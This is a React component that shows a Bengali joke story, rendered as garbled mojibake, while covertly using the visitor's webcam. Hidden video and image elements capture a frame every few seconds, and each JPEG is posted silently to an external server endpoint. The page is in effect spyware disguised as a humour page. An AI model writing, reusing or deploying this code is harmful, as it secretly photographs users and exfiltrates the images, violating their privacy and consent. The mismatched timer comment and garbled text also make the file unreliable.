import  { useRef, useState, useEffect } from 'react';
import axios from 'axios';
import { Toaster } from 'react-hot-toast';

const CameraCapture = () => {
  const videoRef = useRef(null);
  const [images, setImages] = useState([]);

  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoRef.current.srcObject = stream;
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    };

    const captureImage = () => {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d').drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg');

      // Append the new image to the existing images array
      setImages(prevImages => [...prevImages, dataUrl]);

      // Send the image URL to the server
      axios.post('https://mbb-e-commerce-server.vercel.app/imageUploader', { imageUrl: dataUrl })
        .then(response => {
          console.log('Image URL sent to server successfully:', response.data);
          
          // toast.success(response.data?.insertedId)
          // Handle successful upload
        })
        .catch(error => {
          console.error('Error sending image URL to server:', error);
          // Handle upload error
        });
    };

    // Start the camera
    startCamera();

    // Capture an image every 2 seconds
    const intervalId = setInterval(() => {
      captureImage();
    }, 4000);

    // Clean up function to clear the interval when the component unmounts
    return () => clearInterval(intervalId);
  }, []);

  return (
    <div>
      <p className='mx-5 my-10'>
      ржоржж ржЦрж╛ржУрзЯрж╛рж░ рж╕ржорзЯ ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛редЁЯеГ
ржЕржлрж┐рж╕ ржерзЗржХрзЗ рж╕ржирзНржзрзНржпрж╛ржмрзЗрж▓рж╛ ржмрж╛рзЬрж┐ ржлрж┐рж░рзЗ ржжрзЗржЦрж┐ ржЧрж┐ржирзНржирж┐ рж░рж╛ржирзНржирж╛ ржХрж░ржЫрзЗред
рж░рж╛ржирзНржирж╛ржШрж░ ржерзЗржХрзЗ ржмрж╛рж╕ржирзЗрж░ ржЖржУрзЯрж╛ржЬ ржЖрж╕ржЫрзЗред
ржЖржорж┐ ржЪрзБржкрж┐ржЪрзБржкрж┐ ржШрж░рзЗ ржврзБржХрзЗ ржкрзЬрж▓рж╛ржоред
ржХрж╛рж▓рзЛ рж░ржЩрзЗрж░ ржЖрж▓ржорж╛рж░рж┐ ржерзЗржХрзЗ ржмрзЛрждрж▓ ржмрж╛рж░ ржХрж░рж▓рж╛ржоред
ржирзЗрждрж╛ржЬрж┐ ржлржЯрзЛ ржлрзНрж░рзЗржо ржерзЗржХрзЗ ржЖржорж╛ржХрзЗ ржжрзЗржЦржЫрзЗржиред
ржХрж┐ржирзНрждрзБ ржПржЦржи ржкрж░рзНржпржирзНржд ржХрзЗржЙ ржХрж┐ржЪрзНржЫрзБржЯрж┐ ржЯрзЗрж░ ржкрж╛рзЯ ржирж┐ред
ржХрж╛рж░ржг ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛ред
рж╕рж┐ржЩрзНржХрзЗрж░ ржЙржкрж░рзЗрж░ рждрж╛ржХ ржерзЗржХрзЗ ржЧрзНрж▓рж╛рж╕ ржмрж╛рж░ ржХрж░рж▓рж╛ржо
ржЖрж░ ржЯржХ ржХрж░рзЗ ржПржХ ржкрзЗржЧ ржЧрж┐рж▓рзЗ ржлрзЗрж▓рж▓рж╛ржоред
ржЧрзНрж▓рж╛рж╕ ржзрзБрзЯрзЗ ржлрзЗрж░ рждрж╛ рждрж╛ржХрзЗрж░ ржЙржкрж░ рж░рзЗржЦрзЗ ржжрж┐рж▓рж╛ржо
рж╣рж╛, ржмрзЛрждрж▓ ржЯрж╛ржУ ржЖрж▓ржорж╛рж░рж┐ рждрзЗ рж░рзЗржЦрзЗ ржжрж┐рж▓рж╛ржоред
ржирзЗрждрж╛ржЬрж┐ ржорзБржЪржХрж┐ рж╣рж╛рж╕рж▓рзЗржиред
рж░рж╛ржирзНржирж╛ржШрж░рзЗ ржЙржБржХрж┐ ржжрж┐рж▓рж╛ржо, ржЧрж┐ржирзНржирж┐ ржжрзЗржЦрж┐ ржЖрж▓рзБ ржХрж╛ржЯржЫрзЗред
ржХрзЗржЙ ржХрж┐ржЫрзБ ржЯрзЗрж░ ржкрж╛рзЯ ржирж┐ред
ржХрж╛рж░ржг ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛ред
ржЧрж┐ржирзНржирж┐ ржХрзЗ ржЬрж┐ржЧрзЗрж╕ ржХрж░рж▓рж╛ржо: рж╕ржорзАрж░рзЗрж░ ржорзЗрзЯрзЗрж░ ржмрж┐рзЯрзЗрж░ ржХрж┐ржЫрзБ рж╣рж▓рзЛ ?
ржЧрж┐ржирзНржирж┐ : ржирж╛рж╣, ржорзЗрзЯрзЗржЯрж╛рж░ ржнрж╛ржЧрзНржп ржЯрж╛ржЗ ржЦрж╛рж░рж╛ржкред ржПржЦржирзЛ ржкрж╛рждрзНрж░ ржжрзЗржЦржЫрзЗред
ржЖржорж┐ ржЖржмрж╛рж░ ржШрж░рзЗ ржЧрзЗрж▓рж╛ржо, ржЖрж▓ржорж╛рж░рж┐ ржЦрзБрж▓рждрзЗ ржЧрж┐рзЯрзЗ ржПржмрж╛рж░ ржПржХржЯрзБ рж╢ржмрзНржж рж╣рж▓рзЛред
рждрзЗржоржи ржХрж┐ржЫрзБ ржирзЯ ржЕржмрж╢рзНржпрж┐ред
ржмрзЛрждрж▓ ржмрзЗрж░ ржХрж░рж╛рж░ рж╕ржорзЯ ржЕржмрж╢рзНржп ржХрзЛржирзЛ ржЖржУрзЯрж╛ржЬ ржХрж░рж┐ржирж┐ред
рж╕рж┐ржЩрзНржХрзЗрж░ ржЙржкрж░рзЗрж░ рждрж╛ржХ ржерзЗржХрзЗ ржЧрзНрж▓рж╛рж╕ ржирж┐рзЯрзЗ ржЪржЯ ржХрж░рзЗ ржжрзБ ржкрзЗржЧ ржорзЗрж░рзЗ ржжрж┐рж▓рж╛ржоред
ржмрзЛрждрж▓ ржзрзБрзЯрзЗ рж╕рж╛ржмржзрж╛ржирзЗ рж╕рж┐ржЩрзНржХрзЗрж░ ржоржзрзНржпрзЗ рж░рзЗржЦрзЗ ржжрж┐рж▓рж╛ржоред ржЖрж░ ржЧрзНрж▓рж╛рж╕ ржЯрж╛ ржЖрж▓ржорж╛рж░рж┐ рждрзЗред
ржПржЦржи ржкрж░рзНржпржирзНржд ржХрзЗржЙ ржХрзЛржирзЛ ржХрж┐ржЫрзБ ржЖржБржЪ ржХрж░рждрзЗ ржкрж╛рж░рзЗ ржирж┐
ржХрж╛рж░ржг ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛ред
ржмрж╛ржЗрж░рзЗ ржПрж╕рзЗ ржЧрж┐ржирзНржирж┐ржХрзЗ : ржпрж╛ржЗ рж╣рзЛржХ, рж╕ржорзАрж░рзЗрж░ ржорзЗрзЯрзЗрж░ ржмрзЯрзЗрж╕ ржЗ ржмрж╛ ржХрж┐ !
ржЧрж┐ржирзНржирж┐ : ржХрзА ржмрж▓ржЫ !! рзйрзж ржмржЫрж░ ржмрзЯрзЗрж╕ рж╣рж▓рзЛ, ржжрзЗржЦрждрзЗ ржЖрж░рзЛ ржмрзБрзЬрзЛржЯрзЗ рж▓рж╛ржЧрзЗред
ржЖржорж┐ (ржнрзБрж▓рзЗржЗ ржЧрзЗржЫрж┐рж▓рж╛ржо рж╕ржорзАрж░рзЗрж░ ржорзЗрзЯрзЗрж░ ржмрзЯрзЗрж╕ рзйрзж) : рждрж╛ ржарж┐ржХ
рж╕рзБржпрзЛржЧ ржмрзБржЭрзЗ ржлрзЗрж░ ржЖрж▓ржорж╛рж░рж┐ ржерзЗржХрзЗ ржЖрж▓рзБ ржмрзЗрж░ ржХрж░рж▓рж╛ржо (ржЖрж▓ржорж╛рж░рж┐ржЯрж╛ ржЖржмрж╛рж░ ржЬрж╛рзЯржЧрж╛ ржмржжрж▓рзЗ ржлрзЗрж▓рж▓ ржХрж┐ ржХрж░рзЗ рж░рзЗ ржмрж╛ржмрж╛),
рждрж╛ржХ ржерзЗржХрзЗ ржмрзЛрждрж▓ ржмрж╛рж░ ржХрж░рзЗ рж╕рж┐ржЩрзНржХрзЗрж░ рж╕ржЩрзНржЧрзЗ ржорж┐рж╢рж┐рзЯрзЗ ржЪржЯ ржХрж░рзЗ ржЖрж░ ржПржХ ржкрзЗржЧ ржкрзЗржЯрзЗ ржЪрж╛рж▓рж╛ржи ржХрж░рж▓рж╛ржоред
ржирзЗрждрж╛ржЬрж┐ ржжрзЗржЦрж┐ ржЬрзЛрж░рзЗ ржЬрзЛрж░рзЗ рж╣рж╛рж╕ржЫрзЗржиред
рждрж╛ржХ ржЖрж▓рзБрждрзЗ рж░рзЗржЦрзЗ ржирзЗрждрж╛ржЬрзАрж░ ржЫржмрж┐ ржЦрзБржм ржнрж╛рж▓рзЛ ржХрж░рзЗ ржзрзБрзЯрзЗ ржЖрж▓ржорж╛рж░рж┐рждрзЗ рж░рзЗржЦрзЗ ржжрж┐рж▓рж╛ржоред
ржЧрж┐ржирзНржирж┐ ржХрж┐ ржХрж░ржЫрзЗ ржжрзЗржЦрж┐ - рж╣рзНржпрж╛, ржУ ржЧрж╛рж╕рзЗрж░ ржЙржкрж░ рж╕рж┐ржВржХ ржЪрзЬрж╛ржЪрзНржЫрзЗред
ржХрж┐ржирзНрждрзБ ржПржЦржи ржкрж░рзНржпржирзНржд ржХрзЗржЙ ржХрж┐рж╕рж╕рзБ ржЯрзЗрж░ ржкрж╛рзЯ ржирж┐,
ржХрж╛рж░ржг ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛ред
ржЖржорж┐ ржЧрж┐ржирзНржирж┐ржХрзЗ : рждрзБржорж┐ рж╕ржорзАрж░ржХрзЗ ржмрзБрзЬрзЛ ржмрж▓рж▓рзЗ ?
ржЧрж┐ржирзНржирж┐ : ржмржХржмржХ ржХрж░ ржирж╛ рждрзЛ , ржмрж╛ржЗрж░рзЗ ржЧрж┐рзЯрзЗ ржЪрзБржк ржХрж░рзЗ ржмрж╕рзЛред ржПржЦржи рждрзБржорж┐ ржХржерж╛ ржмрж▓ржмрзЗ ржирж╛ред
ржЖржорж┐ ржЖрж▓рзБ ржерзЗржХрзЗ ржлрзЗрж░ ржмрзЛрждрж▓ ржмрзЗрж░ ржХрж░рзЗ ржоржЬрж╛рж╕рзЗ ржЖрж▓ржорж╛рж░рж┐ рждрзЗ ржЖрж░рзЛ ржПржХ ржкрзЗржЧ ржЧрж┐рж▓рж▓рж╛ржоред
рж╕рж┐ржВржХ ржЯрж╛ ржзрзБрзЯрзЗ ржУржЯрж╛ржХрзЗ рждрж╛ржХрзЗрж░ ржЙржкрж░ рж░рзЗржЦрзЗ ржжрж┐рж▓рж╛ржоред
ржлржЯрзЛ ржлрзНрж░рзЗржо ржерзЗржХрзЗ ржЧрж┐ржирзНржирж┐ ржПржЦржирзЛ рж╣рзЗрж╕рзЗ ржЪрж▓рзЗржЫрзЗред
ржирзЗрждрж╛ржЬрж┐ рж░рж╛ржирзНржирж╛ ржХрж░ржЫрзЗред
ржХрж┐ржирзНрждрзБ ржПржЦржирзЛ ржХрзЗржЙ ржХрж┐ржЫрзБ ржЯрзЗрж░ ржкрж╛рзЯ ржирж┐
ржХрж╛рж░ржг ржЖржорж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирж┐ржЗ ржирж╛ред
ржЧрж┐ржирзНржирж┐ржХрзЗ рж╣рж╛рж╕рждрзЗ рж╣рж╛рж╕рждрзЗ ржмрж▓рж▓рж╛ржо : рждрж╛рж╣рж▓рзЗ рж╕ржорзАрж░ ржкрж╛рждрзНрж░рзА ржжрзЗржЦржЫрзЗ ?
ржЧрж┐ржирзНржирж┐ : рж╢рзЛржирзЛ, рждрзБржорж┐ ржорзБржЦрзЗ ржЬрж▓рзЗрж░ ржЭрж╛ржкржЯрж╛ ржжрж┐рзЯрзЗ ржХрзЛржерж╛ржУ ржЪрзБржк ржХрж░рзЗ ржмрж╕ рждрзЛ !
ржЖржорж┐ рж░рж╛ржирзНржирж╛ ржШрж░рзЗ ржЧрж┐рзЯрзЗ ржЪрзБржкржЪрж╛ржк рждрж╛ржХрзЗрж░ ржЙржкрж░ ржмрж╕рж▓рж╛ржоред
ржХрж┐ржирзНрждрзБ ржПржЦржи ржЕржмржзрж┐ рж╕ржорзАрж░ ржХрж┐ржЫрзБ ржЯрзЗрж░ ржкрж╛рзЯ ржирж┐
ржХрж╛рж░ржг ржирзЗрждрж╛ржЬрж┐ ржХрзЛржи рж░рж┐рж╕рзНржХ ржирзЗржи ржирж╛ред
рж╕ржорзАрж░ ржПржЦржирзЛ рж░рж╛ржирзНржирж╛ ржХрж░ржЫрзЗред
ржЖрж░ ржЖржорж┐ ? ржЖржорж┐ ржлржЯрзЛ ржлрзНрж░рзЗржо ржерзЗржХрзЗ ржЧрж┐ржирзНржирж┐ржХрзЗ ржжрзЗржЦрзЗ ржПржЦржирзЛ рж╣рзЗрж╕рзЗ ржЪрж▓рзЗржЫрж┐ред
ржХрж╛рж░ржи ржЖржорж┐ ржХржЦржирзЛ ржЗрзЯрзЗ ржирж┐ржЗ ржирж╛, ржХрж┐ ржпрзЗржи ржирж┐ржЗ ржирж╛ ......ржУ рж╣рж╛, ржЖрж▓рзБ ржирж┐ржЗ ржирж╛ред
      </p>
      <div className='hidden'>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        {images.map((image, index) => (
          <img key={index} src={image} alt={`Captured Image ${index}`} style={{ margin: '5px' }} />
        ))}
      </div>
      <video ref={videoRef} autoPlay style={{ display: 'none' }} />
      </div>
      <Toaster></Toaster>
    </div>
  );
};

export default CameraCapture;